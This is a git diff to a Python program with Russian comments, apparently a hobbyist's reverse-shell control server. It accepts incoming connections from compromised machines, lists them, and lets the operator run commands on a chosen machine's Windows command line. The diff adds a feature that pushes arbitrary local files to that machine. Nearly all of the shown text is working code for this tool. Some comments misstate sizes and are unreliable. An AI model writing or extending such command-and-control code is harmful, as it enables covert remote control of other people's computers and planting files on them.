@@ -30,7 +30,7 @@ def accept_connections():
 
     while True:
         conn, addr = sock.accept()
-        print("Новое соединение: ", addr[0], ", порт: ", addr[1])
+        print("\nНовое соединение: ", addr[0], ", порт: ", addr[1])
 
         conn.setblocking(1) #я не знаю что оно делает, вроде убирает таймаут, поэксперементировать
 
@@ -59,7 +59,7 @@ def list_connections():
             del all_adresses[i]
             continue #перескакивам на начало цикла и не проваливаемся ниже по коду
         result.append(i)
-        print("Доступный адрес: ", all_adresses[i][0], " номер ", i)
+        print("Доступный адрес: ", all_adresses[i][0], " номер ", i, " порт ", all_adresses[i][1])
     return result
 
 
@@ -91,9 +91,33 @@ def reversed_shell(conn):
                 #conn.send(cmd.encode())
                 #conn.close()
                 break
-            conn.send(cmd.encode())
-            data = conn.recv(1024)
-            print(data.decode("cp866"))
+            if "send" in cmd:
+                command, file_name = cmd.split(" ")
+                conn.send((f"send {file_name}").encode()) #подгатавливаем клиента к приему
+
+                op = open(file_name, 'rb')
+                data = op.read(1024000000) #читаем 10000 кб
+                conn.send(data) #100 кб шлем разом одним пакетом
+
+                print(f"Файл {file_name} был успешно отправлен")
+                """
+                Важная заметка: обычно передача файлов проходит килобайтами, но при резализации такой схемы я столкнулся с тем
+                что передача и получение не синхронизируются, сервер сразу вываливает все файлы, клиент не успевает сохранить первый пакет,
+                когда уже был послан следующий/последний и программа на стороне клиента виснет. Поэтому было принято решение слать все данные
+                разом. При необходимости расширить размер отправляемого пакета. 102400 это вроде всего лишь 100 кб.
+                Старый код:
+                while True:
+                    data = op.read(1024)
+                    print(data, " data")
+                    if not data:
+                        break
+                    conn.send(data)
+                """
+            else:
+                #проваливаемся сюда когда шлемкоманды именно для CMD на стороне клиента
+                conn.send(cmd.encode())
+                data = conn.recv(1024)
+                print(data.decode("cp866"))
     except Exception as e:
         print("Коннект утерян с ошибкой: ", str(e))
 
@@ -113,6 +137,9 @@ def do_attack():
             print("Команда не распознана")
 
 if __name__ == '__main__':
+    """
+    Старт программы. Треды были реализованы классическим образом, хотя у автора была реализация через очереди (queue)
+    """
     threadOne = threading.Thread(target=accept_connections, name="start handling connections")
     threadTwo = threading.Thread(target=do_attack, name="choose connection and start reversed shell")
     threadOne.start()
@@ -120,3 +147,11 @@ if __name__ == '__main__':
     threadOne.join()
     threadTwo.join()
 
+"""
+                while True:
+                    data = op.read(1024)
+                    print(data, " data")
+                    if not data:
+                        break
+                    conn.send(data)
+"""
